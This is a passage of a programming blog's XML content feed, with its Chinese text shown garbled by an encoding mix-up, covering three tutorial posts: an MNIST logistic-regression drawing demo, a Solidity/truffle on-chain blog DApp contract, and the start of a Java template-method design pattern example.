class="number">128</span>] = <span class="number">0</span></span><br><span class="line">        x[x &gt;= <span class="number">128</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é¼ æ ‡æ‰‹å†™æ•°å­—</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_circle</span><span class="params">(self, event, x, y, s, a)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event == cv2.EVENT_LBUTTONDOWN:</span><br><span class="line">            self.drawing = <span class="literal">True</span></span><br><span class="line">            self.ix, self.iy = x, y</span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_MOUSEMOVE:</span><br><span class="line">            <span class="keyword">if</span> self.drawing == <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># åœ†åŠå¾„ï¼ˆç¬”ç”»ç²—ç»†ï¼‰è®¾ç½®ä¸º25æ˜¯ä¸ºäº†å’Œmnistæ•°æ®é›†ä¸­çš„æ•°å­—å°½å¯èƒ½ç²—ç»†ç›¸ä¼¼</span></span><br><span class="line">                cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)  <span class="comment"># ç”»ç¬”é¢œè‰²ä¸ºç™½è‰²</span></span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_LBUTTONUP:</span><br><span class="line">            self.drawing = <span class="literal">False</span></span><br><span class="line">            cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(self, predict_label, predict_y)</span>:</span></span><br><span class="line">        message_body = <span class="string">"é¢„æµ‹æ‚¨è¾“å…¥çš„å­—ç¬¦ä¸ºï¼š"</span> + str(predict_label) + <span class="string">"ï¼Œå…¶ä¸­ï¼Œå„ä¸ªå­—ç¬¦çš„é¢„æµ‹æ¦‚ç‡ä¸ºï¼š\n"</span></span><br><span class="line">        <span class="keyword">for</span> index, probability <span class="keyword">in</span> enumerate(predict_y[<span class="number">0</span>]):</span><br><span class="line">            message_body += str(index) + <span class="string">"ï¼š"</span>+str(round(probability, <span class="number">3</span>)) + <span class="string">"ï¼Œ"</span></span><br><span class="line">        message_body += <span class="string">"\nç»“æœä»…ä¾›å‚è€ƒ"</span></span><br><span class="line"></span><br><span class="line">        messageBox = QMessageBox()</span><br><span class="line">        messageBox.setWindowTitle(<span class="string">'é¢„æµ‹ç»“æœ'</span>)</span><br><span class="line">        messageBox.setText(message_body)</span><br><span class="line">        messageBox.setStandardButtons(QMessageBox.Yes | QMessageBox.No)</span><br><span class="line">        buttonY = messageBox.button(QMessageBox.Yes)</span><br><span class="line">        buttonY.setText(<span class="string">'å¥½çš„ï¼ˆå¹¶æ¸…ç©ºç¬”è®°ï¼‰'</span>)</span><br><span class="line">        buttonN = messageBox.button(QMessageBox.No)</span><br><span class="line">        buttonN.setText(<span class="string">'å¥½çš„'</span>)</span><br><span class="line">        messageBox.setStyleSheet(<span class="string">"QPushButton:hover&#123;background-color: rgb(255, 93, 52);&#125; QLabel&#123;font: 14pt \"å¾®è½¯é›…é»‘\"; min-width: 900px;&#125;"</span>)</span><br><span class="line">        messageBox.exec_()</span><br><span class="line">        <span class="keyword">if</span> messageBox.clickedButton() == buttonY:</span><br><span class="line">            self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># æ¸…ç©º</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># l = LogicTrain()</span></span><br><span class="line">    <span class="comment"># l.start_tain(500, 0.5)</span></span><br><span class="line">    a = LogicApplication()</span><br><span class="line">    a.start()</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœå¦‚å›¾</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425144719.png" alt></p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é€»è¾‘å›å½’</tag>
        <tag>MNIST</tag>
      </tags>
  </entry>
  <entry>
    <title>é“¾åš--DAPPç»ƒæ‰‹é¡¹ç›®ï¼ˆä¸€ï¼‰</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ç›®å‰ä¸»æµçš„ç½‘ç«™éƒ½æ˜¯å±äº<code>web2.0</code>çš„åº”ç”¨ï¼Œä¾‹å¦‚æ–°æµªå¾®åšï¼Œæ˜æ˜æˆ‘ä»¬æ‰æ˜¯å†…å®¹çš„è¾“å‡ºè€…ï¼Œå¯æ˜¯æœ€ç»ˆæ”¶ç›Šçš„å¤§å¤´å´æ˜¯è¿™äº›å…¬å¸ï¼Œè€Œä¸”æˆ‘ä»¬çš„æ–‡ç« æ”¾åœ¨ä»–ä»¬çš„æœåŠ¡å™¨ï¼Œä»–ä»¬æƒ³æ€ä¹ˆç€å°±æ€ä¹ˆç€ï¼›è€ŒåŒºå—é“¾æŠ€æœ¯çš„å‡ºç°ï¼Œè®©å»ä¸­å¿ƒåŒ–æ€æƒ³æ¸å…¥äººå¿ƒï¼Œæˆ‘ä»¬çš„æ•°æ®ï¼Œå°†ç”±æˆ‘ä»¬è‡ªå·±æŒæ§ï¼</p>
<p>é“¾ä¸Šåšå®¢ï¼Œè®©æˆ‘ä»¬çš„æ–‡ç« å†™å…¥åŒºå—é“¾ï¼Œäººäººéƒ½æ˜¯è‡ªå·±æ•°æ®çš„æŒæ§è€…ï¼</p>
<p>ä¸»è¦åŠŸèƒ½ï¼š</p>
<ol>
<li>æŸ¥çœ‹æ‰€æœ‰äººå†™çš„æ–‡ç« </li>
<li>ç¼–å†™å’Œä¿®æ”¹è‡ªå·±çš„æ–‡ç« </li>
</ol>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ™ºèƒ½åˆçº¦æ¥å®ç°ï¼Œå€ŸåŠ©<code>truffle</code>å’Œ<code>vue</code>ï¼Œå®ç°æˆ‘ä»¬çš„<code>DAPP</code>çš„å¼€å‘.</p>
<a id="more"></a>

<h2 id="å®ç°æ•ˆæœ"><a href="#å®ç°æ•ˆæœ" class="headerlink" title="å®ç°æ•ˆæœ"></a>å®ç°æ•ˆæœ</h2><p>æœ¬é¡¹ç›®é‡ç‚¹åœ¨äºæ€ä¹ˆä½¿ç”¨<code>JavaScript</code>ï¼Œå…·ä½“è€Œè¨€æ˜¯ä½¿ç”¨<code>web3.js</code>å’Œæ™ºèƒ½åˆçº¦äº¤äº’ï¼Œ<strong>å¯¹äºç³»ç»Ÿçš„æ€§èƒ½ä¼˜åŒ–å°šæœªè€ƒè™‘</strong>ã€‚</p>
<p><img src="https://cdn.yalexin.top/image-20230102094246205.png" alt="image-20230102094246205.png"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094343131.png" alt="image-20230102094343131"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094601906.png" alt="image-20230102094601906"></p>
<h2 id="åˆçº¦å®ç°"><a href="#åˆçº¦å®ç°" class="headerlink" title="åˆçº¦å®ç°"></a>åˆçº¦å®ç°</h2><p>ä¸ç°æœ‰æµè¡Œçš„<code>B/C</code>æ¨¡å¼ç›¸ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»ä¼¼çš„æ•°æ®æä¾›æ–¹ï¼Œåªä¸è¿‡<code>web2.0</code>æ—¶ä»£ä¸‹ï¼Œè¯¥æ•°æ®æä¾›æ–¹æ˜¯ç”±ä¸€ä¸ªä¸­å¿ƒæœåŠ¡å™¨æä¾›ï¼Œåœ¨<code>web3.0</code>ä¸‹ï¼Œè¯¥æ•°æ®ç”±åŒºå—é“¾æä¾›ï¼Œæ™ºèƒ½åˆçº¦å°±æœ‰ç‚¹ç±»ä¼¼æ•°æ®æä¾›æ–¹ã€‚</p>
<p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨<code>Solidity</code>å®ç°æˆ‘ä»¬çš„åˆçº¦.</p>
<h3 id="Node-js-å®‰è£…"><a href="#Node-js-å®‰è£…" class="headerlink" title="Node.js å®‰è£…"></a>Node.js å®‰è£…</h3><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">ã€é“¾æ¥ã€‘</a></p>
<h3 id="Ganache-å®‰è£…"><a href="#Ganache-å®‰è£…" class="headerlink" title="Ganache å®‰è£…"></a>Ganache å®‰è£…</h3><p>å¯ä»¥ä¸‹è½½å‘½ä»¤è¡Œç‰ˆæœ¬çš„ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½æ¡Œé¢ç‰ˆæœ¬çš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯æ¡Œé¢ç‰ˆæœ¬çš„</p>
<p><a href="https://trufflesuite.com/ganache/" target="_blank" rel="noopener">ã€é“¾æ¥ã€‘</a></p>
<h3 id="truffle-å®‰è£…"><a href="#truffle-å®‰è£…" class="headerlink" title="truffle å®‰è£…"></a>truffle å®‰è£…</h3><p>ä½¿ç”¨åŒ…ç®¡ç†å·¥å…·å®‰è£…<code>truffle</code>ï¼Œå®ƒæ˜¯é’ˆå¯¹åŸºäºä»¥å¤ªåŠçš„<code>Solidity</code>è¯­è¨€çš„ä¸€å¥—å¼€å‘æ¡†æ¶:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g truffle</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle --version</span></span><br><span class="line">Truffle v5.7.1 (core: 5.7.1)</span><br><span class="line">Ganache v7.6.0</span><br><span class="line">Solidity v0.5.16 (solc-js)</span><br><span class="line">Node v18.12.1</span><br><span class="line">Web3.js v1.8.1</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå®‰è£…è¿‡ç¨‹é‡åˆ°ç½‘ç»œé—®é¢˜ï¼Œå¯ä»¥å°è¯•æ¢æºæˆ–è€…ä½¿ç”¨<code>cnpm</code></p>
<p>ç„¶åä½¿ç”¨<code>truffle</code>æ¥åˆå§‹åŒ–é¡¹ç›®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle init</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹é¡¹ç›®ç»“æ„ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree</span></span><br><span class="line">D:.</span><br><span class="line">â”‚  truffle-config.js</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€contracts</span><br><span class="line">â”œâ”€migrations</span><br><span class="line">â””â”€test</span><br></pre></td></tr></table></figure>

<p><code>contracts</code>å­˜æ”¾æˆ‘ä»¬çš„åˆçº¦æ–‡ä»¶ï¼Œ<code>migrations</code>æ–‡ä»¶å¤¹ä¸‹å­˜æ”¾éƒ¨ç½²è„šæœ¬ï¼Œ<code>test</code>æ–‡ä»¶å¤¹ä¸‹å­˜æ”¾æµ‹è¯•è„šæœ¬ã€‚</p>
<p><code>truffle-config.js</code>æ˜¯é…ç½®æ–‡ä»¶ï¼Œç›®å‰æˆ‘ä»¬æš‚æ—¶ä¿®æ”¹çš„æ˜¯<code>networks</code>å¯¹è±¡:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: "127.0.0.1",     // Localhost (default: none)</span><br><span class="line">     port: 7545,            // Standard Ethereum port (default: none)</span><br><span class="line">     network_id: "*",       // Any network (default: none)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œç«¯å£å’Œ<code>Ganache</code>ä¸­è®¾ç½®çš„ä¸€è‡´.</p>
<h3 id="ç¼–å†™åˆçº¦"><a href="#ç¼–å†™åˆçº¦" class="headerlink" title="ç¼–å†™åˆçº¦"></a>ç¼–å†™åˆçº¦</h3><p>è¯¦ç»†å®ç°è¯·å‚è€ƒ<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">ã€é“¾æ¥ã€‘</a></p>
<p>åœ¨contractsæ–‡ä»¶å¤¹ä¸‹ï¼Œæ–°å»ºä¸€ä¸ª<code>ChainBlog.sol</code>æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œå®Œæˆæˆ‘ä»¬çš„åˆçº¦é€»è¾‘ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰çš„æ–‡ç« å­˜æ”¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ­¤å¤–ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ç¯‡æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct Blog &#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    address author;</span><br><span class="line">    string title;</span><br><span class="line">    string summary;</span><br><span class="line">    string content;</span><br><span class="line">    uint256 createTimestamp;</span><br><span class="line">    uint256 lastUpdateTimestamp;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; è®°å½•æ¯ä¸ªäººç¼–å†™çš„æ–‡ç« </span><br><span class="line">Blog[] public blogList;</span><br><span class="line"></span><br><span class="line">event AddBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 createTimestamp);</span><br><span class="line">event ModifyBlogEvent(uint256 id, address author, string old_title, string old_summary, string old_content, string new_title, string new_summary, string new_content, uint256 modifyTimestamp);</span><br><span class="line">event DeleteBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 deleteTimestamp);</span><br></pre></td></tr></table></figure>

<p>å°†<code>blogList</code>è®¾ç½®æˆ<code>public</code>å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬ä»å¤–éƒ¨ç›´æ¥è®¿é—®è¯¥æ•°ç»„ã€‚æˆ‘ä»¬è¿˜å®šä¹‰äº†å‡ ä¸ªäº‹ä»¶ï¼Œè¿™å‡ ä¸ªäº‹ä»¶åæ–‡ä¼šç”¨åˆ°ï¼›è§¦å‘äº‹ä»¶ï¼Œå¯ä»¥ç†è§£æˆæˆ‘ä»¬å¾€æ—¥å¿—ç³»ç»Ÿä¸­å†™å…¥ä¸€ä¸ªæ—¥å¿—ï¼Œèƒ½åˆçº¦çš„å‰ç«¯<code>UI</code>ï¼Œä¾‹å¦‚ï¼Œ<code>Apps</code>ã€<code>web.js</code>ï¼Œæˆ–è€…ä»»ä½•ä¸<code>Ethereum JSON-RPC API</code>è¿æ¥çš„ä¸œè¥¿ï¼Œéƒ½å¯ä»¥ä¾¦å¬è¿™äº›äº‹ä»¶ã€‚</p>
<p><strong>ç¼–å†™æ–‡ç« </strong></p>
<p>æˆ‘è¿™é‡Œè®¾ç½®åšå®¢çš„<code>ID</code>å¯¹åº”å…¶åœ¨æ•°ç»„ä¸­çš„ä¸‹æ ‡ï¼Œå› æ­¤å¦‚æœæƒ³è¦è·å–æŸä¸€ç¯‡æ–‡ç« ï¼Œå¯ä»¥ç›´æ¥æ ¹æ®<code>ID</code>è½¬æ¢æˆç´¢å¼•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addBlog( string memory _title, string memory _summary, string memory _content ) public &#123;</span><br><span class="line">       uint256 currentId &#x3D; blogList.length;</span><br><span class="line">       blogList.push(</span><br><span class="line">           Blog(currentId, msg.sender, _title, _summary, _content, block.timestamp, block.timestamp)</span><br><span class="line">       );</span><br><span class="line">       emit AddBlogEvent(currentId, msg.sender, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹æ–‡ç« </strong></p>
<p>ä¿®æ”¹æ–‡ç« æ—¶å€™ï¼Œåªæœ‰æ–‡ç« çš„æ‰€æœ‰è€…æ‰èƒ½æœ‰æƒä¿®æ”¹ï¼Œä¸”è¦åˆ¤æ–­ä¼ è¿›æ¥çš„<code>id</code>æ˜¯å¦æœ‰æ•ˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function modifyBlogByUserAndId(</span><br><span class="line">       uint256 id,</span><br><span class="line">       string memory _title,</span><br><span class="line">       string memory _summary,</span><br><span class="line">       string memory _content</span><br><span class="line">   ) public &#123;</span><br><span class="line">       require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">       require(msg.sender &#x3D;&#x3D; blogList[id].author, &quot;You can only modify your blog!&quot;);</span><br><span class="line">       uint256 idx &#x3D; id;</span><br><span class="line">       string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">       string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">       string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">       blogList[id] &#x3D; Blog(id, msg.sender, _title, _summary, _content, blogList[id].createTimestamp, block.timestamp);</span><br><span class="line">       emit ModifyBlogEvent(id, msg.sender, old_title, old_summary, old_content, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ é™¤æ–‡ç« </strong></p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨<code>Solidity</code>ä¸­ï¼Œåˆ é™¤æ•°ç»„ä¸­çš„å…ƒç´ åï¼Œä¼šå°†è¯¥å…ƒç´ æ‰€åœ¨çš„ä½ç½®éƒ½ç½®ä¸ºåˆå§‹å€¼ï¼Œå¹¶ä¸”é•¿åº¦ä¸å˜ï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥é€‰æ‹©å°†æœ€åçš„å…ƒç´ å¤åˆ¶åˆ°è¯¥åœ°å€ï¼Œç„¶åä½¿ç”¨<code>pop()</code>å‡½æ•°å°†æœ€åä¸€ä¸ªå…ƒç´ åˆ é™¤ï¼Œè¿™é‡Œæˆ‘å¹¶æ²¡æœ‰é€‰æ‹©è¿™æ ·å­ï¼Œå› ä¸ºæˆ‘æƒ³æŠŠæ–‡ç« IDå’Œå…¶åœ¨æ•°ç»„ä¸­çš„ä¸‹è¾¹å¯¹åº”èµ·æ¥åŒæ—¶ä¸€ç¯‡æ–‡ç« åº”è¯¥æœ‰ä¸€ä¸ªå›ºå®šçš„<code>id</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function deleteBlogByUserAndId(uint256 id) public &#123;</span><br><span class="line">    require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">    require(</span><br><span class="line">        msg.sender &#x3D;&#x3D; blogList[id].author,</span><br><span class="line">        &quot;You can only delete your blog!&quot;</span><br><span class="line">    );</span><br><span class="line">    uint256 idx &#x3D; id;</span><br><span class="line">    string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">    string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">    string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">    delete blogList[idx];</span><br><span class="line">    emit DeleteBlogEvent( id, msg.sender, old_title, old_summary, old_content, block.timestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·å–æ–‡ç« åˆ—è¡¨</strong></p>
<p>æˆ‘ä»¬è™½ç„¶åœ¨å‰é¢å°†<code>blogList</code>è®¾ç½®æˆäº†<code>public</code>ï¼Œä½†æ˜¯å®é™…ä¸Š<code>Solidity</code>ç¼–è¯‘æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„<code>get</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„æ¥æ”¶ä¸€ä¸ªå‚æ•°ä½œä¸ºä¸‹æ ‡ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡è®¿é—®è¯¥å˜é‡ç›´æ¥è·å–æ‰€æœ‰çš„æ–‡ç« ï¼Œæˆ‘ä»¬éœ€è¦æš´éœ²ä¸€ä¸ªå‡½æ•°ï¼Œä½¿å…¶è¿”å›æ‰€æœ‰çš„æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getAll() public view returns(Blog[] memory)&#123;</span><br><span class="line">       return blogList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>view</code>å…³é”®å­—è¯´æ˜è¯¥æ–¹æ³•ä¼šè®¿é—®çŠ¶æ€å˜é‡ï¼ˆ<code>blogList</code>ï¼‰,ä½†æ˜¯ä¸ä¼šä¿®æ”¹å®ƒï¼Œæ˜ç¡®è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå®ƒå¯ä»¥ä¸ºè°ƒç”¨è€…èŠ‚çœ<code>gas</code>ã€‚</p>
<p>éƒ¨ç½²å’Œè¿æ¥å’±ä»¬çš„æ™ºèƒ½åˆçº¦å°†åœ¨ä¹‹åè¿›è¡Œã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>ã€1ã€‘ChainBlogï¼ˆæœ¬é¡¹ç›®å®Œæ•´æºç ï¼‰.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>ã€2ã€‘web3.jsä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>ã€3ã€‘Solidityä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>ã€4ã€‘truffleæ–‡æ¡£.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>ã€5ã€‘å¼€å‘ã€éƒ¨ç½²ç¬¬ä¸€ä¸ªDApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>ã€6ã€‘DAppæ•™ç¨‹ï¼šç”¨Truffle å¼€å‘ä¸€ä¸ªé“¾ä¸Šè®°äº‹æœ¬.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>ã€7ã€‘Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾è®¡æ¨¡å¼ä¹‹æ¨¡æ¿æ–¹æ³•</title>
    <url>/2020/05/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼šå‡å¦‚å­¦é™¢é€šçŸ¥å¼€å­¦ï¼Œé‚£ä¹ˆæ¯ä¸ªå­¦ç”Ÿæ‰€ç»å†çš„æµç¨‹å°±æ˜¯ï¼šæ”¶åˆ°é€šçŸ¥ â€“&gt; è´­ç¥¨ â€“&gt; åç«è½¦/åé£æœº/åå¤§å·´/â€¦â€¦  â€“&gt; è¿”æ ¡æŠ¥é“ã€‚å¯¹åº”çš„å®ç°ä»£ç å¦‚ä¸‹ï¼š<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.design.templateMethod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        StudenA A = <span class="keyword">new</span> StudenA();</span><br><span class="line">        A.process();</span><br><span class="line">        StudenB B = <span class="keyword">new</span> StudenB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenA</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byTrain();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byTrain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘åœ¨ç«è½¦ä¸Šå•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘è´­ç¥¨å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ”¶åˆ°é€šçŸ¥å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ³¨å†Œå®Œæ¯•å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenB</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byPlane();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byPlane</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘åœ¨é£æœºä¸Šå•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘è´­ç¥¨å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ”¶åˆ°é€šçŸ¥å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ³¨å†Œå®Œæ¯•å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

